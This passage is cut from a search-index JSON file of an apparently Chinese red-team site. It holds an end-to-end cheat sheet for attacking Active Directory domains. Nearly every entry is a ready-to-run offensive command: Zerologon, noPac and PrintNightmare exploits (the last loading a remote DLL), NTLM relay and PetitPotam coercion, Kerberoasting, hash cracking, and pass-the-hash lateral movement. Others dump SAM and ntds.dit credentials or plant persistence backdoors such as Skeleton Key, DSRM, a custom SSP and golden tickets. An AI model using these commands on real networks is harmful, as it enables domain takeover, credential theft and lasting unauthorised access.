Ticket","title":"Kerberos\u7684\u94f6\u7968\u52a1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_14","text":"\u4e0e\u4e0a\u9762SPN\u626b\u63cf\u7c7b\u4f3c\u7684\u539f\u7406 https://github.com/nidem/kerberoast \u83b7\u53d6\u6240\u6709\u7528\u4f5cSPN\u7684\u5e10\u6237 setspn -T PENTEST.com -Q */* \u4eceMimikatz\u7684RAM\u4e2d\u63d0\u53d6\u83b7\u5f97\u7684\u95e8\u7968 kerberos::list /export \u7528rgsrepcrack\u7834\u89e3 tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi","title":"\u57df\u670d\u52a1\u8d26\u53f7\u7834\u89e3"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_15","text":"\u4ece\u641c\u96c6\u7684\u5bc6\u7801\u91cc\u9762\u627e\u7ba1\u7406\u5458\u7684\u5bc6\u7801","title":"\u51ed\u8bc1\u76d7\u7a83"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ntlm-relay","text":"One API call away from Domain Admin privexchange Exchange2domain \u7528\u4e8e\u4e3b\u52a8\u8ba9\u76ee\u6807\u673a\u5668\u53d1\u8d77NTLM\u8bf7\u6c42\u7684\u65b9\u6cd5\uff1a printerbug PetitPotam Relay LDAP: CVE-2019-1040-dcpwn Relay AD CS/PKI: AD CS/PKI template exploit \u96c6\u6210\u51e0\u4e2a\u5229\u7528\u7684\u5de5\u5177\uff1a Relayx \u5185\u7f51445\u7aef\u53e3\u8f6c\u53d1\uff1a PortBender","title":"NTLM relay"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#kerberos_2","text":"Wagging-the-Dog.html s4u2pwnage Attacking Kerberos Delegation \u7528\u6253\u5370\u670d\u52a1\u83b7\u53d6\u57df\u63a7 Computer Takeover Combining NTLM Relaying and Kerberos delegation CVE-2019-1040","title":"Kerberos\u59d4\u6d3e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_16","text":"\u5b9e\u5728\u641e\u4e0d\u5b9a\u518d\u641eARP","title":"\u5730\u5740\u89e3\u6790\u534f\u8bae"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#zerologon","text":"python3 cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip> secretsdump.py <DOMAIN>/<MACHINE_BIOS_NAME>\\$@<IP> -no-pass -just-dc-user \"Administrator\" secretsdump.py -hashes :<HASH_admin> <DOMAIN>/Administrator@<IP> python3 restorepassword.py -target-ip <IP> <DOMAIN>/<MACHINE_BIOS_NAME>@<MACHINE_BIOS_NAME> -hexpass <HEXPASS> CVE-2020-1472\u7684\u5206\u6790\u4e0e\u590d\u73b0 (0range-x.github.io) **1\u3001\u5229\u7528Mimikatz **check lsadump::zerologon /target:dc1.exploit.local /account:dc1$ exploit lsadump::zerologon /target:dc1.exploit.local /account:dc1$ /exploit dcsync lsadump::dcsync /dc:dc1.exploit.local /authuser:dc1$ /authdomain:exploit.local /authpassword:\"\" /domain:exploit.local /authntlm /user:krbtgt restore lsadump::postzerologon /target:conttosson.locl /account:dc$ 2\u3001\u5229\u7528impacket\uff1a \u53d6\u76ee\u6807\u4e3b\u673a\u540d+IP install \u4fee\u6539\u7248\u672c\u7684impacket Exp python cve-2020-1472-exploit.py DC2008 10.211.55.200 secretsdump.py -no-pass cgdomain.com/'DC2008$'@10.211.55.200 -history -just-dc-user administrator secretsdump.py -no-pass cgdomain.com/administrator@10.211.55.200 -hashes aad3b435b51404eeaad3b435b51404ee:3add1560657a19b3166247eb3eb149ae \u83b7\u53d6\u5230\u65e7\u7684\u5bc6\u7801\u660e\u6587hex\uff0c\u8fd8\u539f python restorepassword.py cgdomain.com/DC2008@DC2008 -target-ip 10.211.55.200 -hexpass 59958639cbdd4523de5d42b01adb0e256e0d39aef14c8eef31f4c078862109f253bbb7b3817ab123d013856c028fa4993f5f5b9a830a3a98d87483b29df3fb55082a1f464b19220a2c04f6605d2d321a04afbb551f8f19a13d399f9f5af2aa23c5b76b49001033516fefd90cb0348256e8282b22cbf9e70d82a8b8d2916d578246e288af3af727533d36ad8950fe1c513771377d98a947c4a8eae2b581a74b6687a2e533b7e89e8d03c2e6c2123d519489869a6e33d3a8884be33107060b62e2852502261f48c097ddb68750cc55b7688cc951441cf02989a307f55c008e978edbaf31766d17b53505016c7580cb480b \u6062\u590d\u65b9\u6cd52 \u901a\u8fc7wmic, pass the hash \u62ff\u5230\u57df\u63a7\u5236\u5668\u4e2d\u7684\u672c\u5730\u7ba1\u7406\u5458\u6743\u9650(\u57df\u7ba1) wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8adfc85c3490040e942ae1e6c68f645e test.local/Administrator@10.211.55.38 \u7136\u540e\u5206\u522b\u6267\u884c,\u62f7\u8d1d\u672c\u673a\u4e2dSAM\u6570\u636e\u5e93\u5230\u672c\u5730 - reg save HKLM\\SYSTEM system.save - reg save HKLM\\SAM sam.save - reg save HKLM\\SECURITY security.save - get system.save - get sam.save - get security.save - del /f system.save - del /f sam.save - del /f security.save \u63d0\u53d6\u660e\u6587hash secretsdump.py -sam sam.save -system system.save -security security.save LOCAL \u7136\u540e\u6062\u590d\u3002","title":"zerologon\u6f0f\u6d1e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#cve-2021-42278-cve-2021-42287","text":"sam-the-admin noPac: CVE-2021-42287/CVE-2021-42278 ./noPac.exe -domain dc.com -user username -pass 'password' /dc owa.dc.com /mAccount mAusername /mPassword password /service cifs /ptt","title":"CVE-2021-42278 &amp;&amp; CVE-2021-42287"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#4smb","text":"enum4linux -a -u \"\" -p \"\" <dc-ip> && enum4linux -a -u \"guest\" -p \"\" <dc-ip> smbmap -u \"\" -p \"\" -P 445 -H <dc-ip> && smbmap -u \"guest\" -p \"\" -P 445 -H <dc-ip> smbclient -U '%' -L //<dc-ip> && smbclient -U 'guest%' -L //<dc-ip> cme smb <ip> -u '' -p '' # \u679a\u4e3e\u53ef\u7a7aSession\u8bbf\u95ee\u7684SMB\u5171\u4eab cme smb <ip> -u 'a' -p '' #\u679a\u4e3e\u53ef\u533f\u540d\u8bbf\u95ee\u7684SMB\u5171\u4eab","title":"4.\u5217\u51fa\u53ef\u533f\u540d\u8bbf\u95ee\u7684SMB\u5171\u4eab"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#5ldap","text":"nmap -n -sV --script \"ldap* and not brute\" -p 389 <dc-ip> ldapsearch -x -h <ip> -s base","title":"5.\u679a\u4e3eLDAP"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#6","text":"enum4linux -U <dc-ip> | grep 'user:' crackmapexec smb <ip> -u <user> -p '<password>' --users nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<users_list_file>\" <ip> OSINT - \u5728\u4e92\u8054\u7f51\u4e0a\u5bfb\u627e\u7528\u6237\u540d","title":"6.\u67e5\u627e\u7528\u6237\u540d"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_17","text":"","title":"\u5f97\u5230\u8d26\u53f7\uff0c\u4f46\u662f\u6ca1\u6709\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_18","text":"\u83b7\u53d6\u57df\u5bc6\u7801\u7b56\u7565 \uff1a crackmapexec <IP> -u 'user' -p 'password' --pass-pol enum4linx -u 'username' -p 'password' -P <IP> cme smb <dc-ip> -u user.txt -p password.txt --no-bruteforce # \u4e0d\u7206\u7834\uff0c\u53ea\u6d4b\u8bd5\u5355\u4e00\u7684 user=password cme smb <dc-ip> -u user.txt -p password.txt # \u4ea4\u53c9\u7206\u7834\uff0c\u6839\u636e\u5bc6\u7801\u7b56\u7565\uff0c\u5931\u8d25\u8fc7\u591a\u53ef\u80fd\u4f1a\u88ab\u5c01\u7981","title":"\u5bc6\u7801\u55b7\u6d12"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#asrep-roasting","text":"","title":"ASREP-Roasting\u653b\u51fb"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#hash_1","text":"python GetNPUsers.py <domain>/ -usersfile <usernames.txt> -format hashcat -outputfile <hashes.domain.txt> Rubeus asreproast /format:hashcat","title":"\u83b7\u53d6hash"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#asrep-roastable","text":"Get-DomainUser -PreauthNotRequired -Properties SamAccountName MATCH (u:User {dontreqpreauth:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p","title":"\u83b7\u53d6ASREP-Roastable\u8d26\u53f7"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_19","text":"","title":"\u62ff\u5230\u4efb\u610f\u4e00\u4e2a\u57df\u7528\u6237\u7684\u8d26\u53f7\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_20","text":"","title":"\u83b7\u53d6\u5176\u4ed6\u8d26\u6237\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#1_1","text":"GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>","title":"1.\u83b7\u53d6\u57df\u5185\u6240\u6709\u8d26\u6237\u540d"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#2-smb","text":"cme smb <ip> -u <user> -p <password> --shares","title":"2.\u679a\u4e3e SMB \u5171\u4eab"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#3bloodhound","text":"bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all","title":"3.bloodhound"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#4powerview-pywerview","text":"","title":"4.powerview / pywerview"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#kerberoasting","text":"","title":"Kerberoasting\u653b\u51fb"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#hash_2","text":"GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password> Rubeus kerberoast","title":"\u83b7\u53d6hash"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#kerberoastable","text":"Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName MATCH (u:User {hasspn:true}) RETURN u MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p","title":"\u67e5\u627e kerberoastable \u8d26\u53f7"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#ms14-068","text":"FindSMB2UPTime.py rpcclient $> lookupnames <name> wmic useraccount get name,sid auxiliary/admin/kerberos/ms14_068_kerberos_checksum goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target> kerberos::ptc \"<ticket>\"","title":"MS14-068"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#printnightmare","text":"CVE-2021-1675.py <domain>/<user>:<password>@<target> '\\\\<smb_server_ip>\\<share>\\inject.dll'","title":"PrintNightmare"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#dns","text":"dnstool.py -u 'DOMAIN\\user' -p 'password' --record '*' --action query <dc_ip>","title":"\u679a\u4e3e DNS \u670d\u52a1\u5668"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#7relaypoisoning","text":"","title":"7.relay/poisoning\u653b\u51fb"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#smb","text":"nmap -Pn -sS -T4 --open --script smb-security-mode -p445 ADDRESS/MASK use exploit/windows/smb/smb_relay cme smb $hosts --gen-relay-list relay.txt","title":"\u626b\u63cf\u6ca1\u5f00\u542fSMB\u7b7e\u540d\u7684\u673a\u5668"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#petitpotam","text":"PetitPotam.py -d <domain> <listener_ip> <target_ip> \u540e\u7eed\u53ef\u4ee5\u8ddf\u7740adcs\u653b\u51fb","title":"PetitPotam"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_21","text":"responder -i eth0 mitm6 -d <domain>","title":"\u76d1\u542c"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#smb-ipv6-adcs","text":"","title":"\u65e0SMB\u7b7e\u540d || \u5f00\u542fIPv6 || ADCS"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#1ms08-068","text":"use exploit/windows/smb/smb_relay #\u5e38\u7528\u4e8ewindows2003 / windows server2008 responder -I eth0 # \u8bb0\u5f97\u5148\u5173\u95ed\u672c\u673a\u7684 smb \u548c http \u670d\u52a1 ntlmrelayx.py -tf targets.txt","title":"1.MS08-068"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#2mitm6-i-eth0-d","text":"ntlmrelayx.py -6 -wh <attacker_ip> -l /tmp -socks -debug ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access getST.py -spn cifs/<target> <domain>/<netbios_name>\\$ -impersonate <user>","title":"2.mitm6 -i eth0 -d"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#3adcs","text":"ntlmrelayx.py -t http://<dc_ip>/certsrv/certfnsh.asp -debug -smb2support --adcs --template DomainController Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt","title":"3.adcs"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#8hash","text":"","title":"8.\u62ff\u5230hash\u7834\u89e3"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#1lm","text":"john --format=lm hash.txt hashcat -m 3000 -a 3 hash.txt","title":"1.LM"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#2ntlm","text":"john --format=nt hash.txt hashcat -m 1000 -a 3 hash.txt","title":"2.NTLM"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#3ntlmv1","text":"john --format=netntlm hash.txt hashcat -m 5500 -a 3 hash.txt","title":"3.NTLMv1"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#4ntlmv2","text":"john --format=netntlmv2 hash.txt hashcat -m 5600 -a 0 hash.txt rockyou.txt","title":"4.NTLMv2"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#5kerberos-5-tgs","text":"john spn.txt --format=krb5tgs --wordlist=rockyou.txt hashcat -m 13100 -a 0 spn.txt rockyou.txt","title":"5.Kerberos 5 TGS"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#6kerberos-asrep","text":"hashcat -m 18200 -a 0 AS-REP_roast-hashes rockyou.txt","title":"6.Kerberos ASREP"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#9","text":"","title":"9.\u6a2a\u5411\u79fb\u52a8"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#1pth","text":"psexec.py -hashes \":<hash>\" <user>@<ip> wmiexec.py -hashes \":<hash>\" <user>@<ip> atexec.py -hashes \":<hash>\" <user>@<ip> \"command\" evil-winrm -i <ip>/<domain> -u <user> -H <hash> xfreerdp /u:<user> /d:<domain> /pth:<hash> /v:<ip>","title":"1.PTH"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#2ptk","text":"python getTGT.py <domain>/<user> -hashes :<hashes> export KRB5CCNAME=/root/impacket-examples/domain_ticket.ccache python psexec.py <domain>/<user>@<ip> -k -no-pass Rubeus asktgt /user:victim /rc4:<rc4value> Rubeus ptt /ticket:<ticket> Rubeus createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe] Rubeus ptt /luid:0xdeadbeef /ticket:<ticket>","title":"2.PTK"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#3_1","text":"","title":"3.\u975e\u7ea6\u675f\u59d4\u6d3e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_22","text":"privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export Rubeus dump /service:krbtgt /nowrap Rubeus dump /luid:0xdeadbeef /nowrap","title":"\u83b7\u53d6\u7968\u636e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_23","text":"Get-NetComputer -Unconstrained Get-DomainComputer -Unconstrained -Properties DnsHostName MATCH (c:Computer {unconstraineddelegation:true}) RETURN c MATCH (u:User {owned:true}), (c:Computer {unconstraineddelegation:true}), p=shortestPath((u)-[*1..]->(c)) RETURN p","title":"\u67e5\u627e\u975e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#4","text":"","title":"4.\u7ea6\u675f\u59d4\u6d3e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_24","text":"privilege::debug sekurlsa::tickets /export sekurlsa::tickets / Rubeus dump /service:krbtgt /nowrap Rubeus dump /luid:0xdeadbeef /nowrap","title":"\u83b7\u53d6\u7968\u636e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_25","text":"Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) RETURN p MATCH (u:User {owned:true}), (c:Computer {name: \"<MYTARGET.FQDN>\"}), p=shortestPath((u)-[*1..]->(c)) RETURN p","title":"\u67e5\u627e\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#5","text":"","title":"5.\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u59d4\u6d3e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#6dcsync","text":"lsadump::dcsync /domain:htb.local /user:krbtgt # Administrators, Domain Admins, Enterprise Admins \u7ec4\u4e0b\u7684\u8d26\u6237\u90fd\u884c","title":"6.dcsync"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#7-spoolservice","text":"rpcdump.py <domain>/<user>:<password>@<domain_server> | grep MS-RPRN printerbug.py '<domain>/<username>:<password>'@<Printer IP> <RESPONDERIP>","title":"7.\u6253\u5370\u673a SpoolService \u6f0f\u6d1e\u5229\u7528"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#8adaclaclpwnpy","text":"GenericAll on User GenericAll on Group GenericAll / GenericWrite / Write on Computer WriteProperty on Group Self (Self-Membership) on Group WriteProperty (Self-Membership) ForceChangePassword WriteOwner on Group GenericWrite on User WriteDACL + WriteOwner","title":"8.AD\u57dfACL\u653b\u51fb(aclpwn.py)"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#9laps","text":"Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\\<login> | Format-Table -AutoSize foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}","title":"9.\u83b7\u53d6LAPS\u7ba1\u7406\u5458\u5bc6\u7801"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#10privexchange","text":"python privexchange.py -ah <attacker_host_or_ip> <exchange_host> -u <user> -d <domain> -p <password> ntlmrelayx.py -t ldap://<dc_fqdn>--escalate-user <user>","title":"10.privexchange\u6f0f\u6d1e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#exchange","text":"Exchange2domain CVE-2018-8581 CVE-2019-1040 CVE-2020-0688 NtlmRelayToEWS ewsManage CVE-2021-26855 CVE-2021-28482","title":"Exchange\u7684\u5229\u7528"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#11ipc","text":"net use \\\\ip\\ipc$ \"password\" /user:\"administrator\" net use \\\\ip\\c$ \"password\" /user:\"administrator\"","title":"11.IPC"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#12","text":"1.\u5411WSUS\u670d\u52a1\u5668\u6570\u636e\u5e93\u6ce8\u5165\u6076\u610f\u7a0b\u5e8f\u66f4\u65b0 WSUSpendu.ps1 # \u9700\u8981\u5148\u62ff\u4e0b WSUS \u66f4\u65b0\u5206\u53d1\u670d\u52a1\u5668 2.MSSQL Trusted Links use exploit/windows/mssql/mssql_linkcrawler 3.GPO Delegation 4.ADCS","title":"12.\u5176\u4ed6\u6a2a\u79fb"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#10","text":"","title":"10.\u6743\u9650\u7ef4\u6301"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_26","text":"dump ntds.dit \u6587\u4ef6 crackmapexec smb 127.0.0.1 -u <user> -p <password> -d <domain> --ntds secretsdump.py '<domain>/<user>:<pass>'@<ip> ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q secretsdump.py -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract windows/gather/credentials/domain_hashdump","title":"\u62ff\u5230\u57df\u63a7\u6743\u9650"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_27","text":"net group \"domain admins\" myuser /add /domain Golden ticket\uff08\u9ec4\u91d1\u7968\u636e\uff09 Silver Ticket\uff08\u767d\u94f6\u7968\u636e\uff09 DSRM \u540e\u95e8\uff1a PowerShell New-ItemProperty \u201cHKLM:\\System\\CurrentControlSet\\Control\\Lsa\\\u201d -Name \u201cDsrmAdminLogonBehavior\u201d -Value 2 -PropertyType DWORD Skeleton Key\uff1a mimikatz \"privilege::debug\" \"misc::skeleton\" \"exit\" \u81ea\u5b9a\u4e49 SSP DLL\uff1a mimikatz \"privilege::debug\" \"misc::memssp\" \"exit\" C:\\Windows\\System32\\kiwissp.log","title":"\u540e\u95e8"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_28","text":"","title":"\u57df\u4fe1\u4efb\u5173\u7cfb"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#-sid-history","text":"Get-NetGroup -Domain <domain> -GroupName \"Enterprise Admins\" -FullData|select objectsid mimikatz lsadump::trust kerberos::golden /user:Administrator /krbtgt:<HASH_KRBTGT> /domain:<domain> /sid:<user_sid> /sids:<RootDomainSID-519> /ptt","title":"\u5b50\u57df\u653b\u51fb\u7236\u57df - SID History\u7248\u8de8\u57df\u9ec4\u91d1\u7968\u636e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#-","text":"\"lsadump::trust /patch\" \"lsadump::lsa /patch\" \"kerberos::golden /user:Administrator /domain:<domain> /sid: <domain_SID> /rc4:<trust_key> /service:krbtgt /target:<target_domain> /ticket: <golden_ticket_path>\"","title":"\u5229\u7528\u57df\u4fe1\u4efb\u5bc6\u94a5\u83b7\u53d6\u76ee\u6807\u57df\u7684\u6743\u9650 - \u4fe1\u4efb\u7968\u636e"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_29","text":"\u5229\u7528ptintbug\u6216petipotam\u6f0f\u6d1e\u4f7f\u5176\u5b83\u6797\u7684DC\u4e3b\u52a8\u8fde\u63a5\u5230\u672c\u6797\u7684\u4e00\u53f0\u65e0\u7ea6\u675f\u59d4\u6d3e\u4e3b\u673a\uff0c\u540c\u65f6\u6293\u53d6\u53d1\u9001\u8fc7\u6765\u7684TGT\uff0c\u7136\u540e\u5373\u53ef\u5c06\u5b83\u7528\u4e8edcsync\u653b\u51fb","title":"\u653b\u51fb\u5176\u5b83\u6797"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#_30","text":"https://adsecurity.org/?p=1929 DS\u6062\u590d\u6a21\u5f0f\u5bc6\u7801\u7ef4\u62a4 DSRM\u5bc6\u7801\u540c\u6b65 Windows Server 2008 \u9700\u8981\u5b89\u88c5KB961320\u8865\u4e01\u624d\u652f\u6301DSRM\u5bc6\u7801\u540c\u6b65\uff0cWindows Server 2003\u4e0d\u652f\u6301DSRM\u5bc6\u7801\u540c\u6b65\u3002KB961320: https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,\u53ef\u53c2\u8003 \uff1a \u5de7\u7528DSRM\u5bc6\u7801\u540c\u6b65\u5c06\u57df\u63a7\u6743\u9650\u6301\u4e45\u5316 DCshadow","title":"\u6d3b\u52a8\u76ee\u5f55\u6301\u4e45\u6027\u6280\u5de7"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#security-support-provider","text":"\u7b80\u5355\u7684\u7406\u89e3\u4e3aSSP\u5c31\u662f\u4e00\u4e2aDLL\uff0c\u7528\u6765\u5b9e\u73b0\u8eab\u4efd\u8ba4\u8bc1 privilege::debug misc::memssp \u8fd9\u6837\u5c31\u4e0d\u9700\u8981\u91cd\u542f c:/windows/system32 \u53ef\u770b\u5230\u65b0\u751f\u6210\u7684\u6587\u4ef6kiwissp.log","title":"Security Support Provider"},{"location":"redteam/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B8%80%E6%9D%A1%E9%BE%99/#sid-history","text":"SID\u5386\u53f2\u8bb0\u5f55\u5141\u8bb8\u53e6\u4e00\u4e2a\u5e10\u6237\u7684\u8bbf\u95ee\u88ab\u6709\u6548\u5730\u514b\u9686\u5230\u53e6\u4e00\u4e2a\u5e10\u6237 mimikatz \"privilege::debug\" \"misc::addsid bobafett ADSAdministrator\"","title":"SID 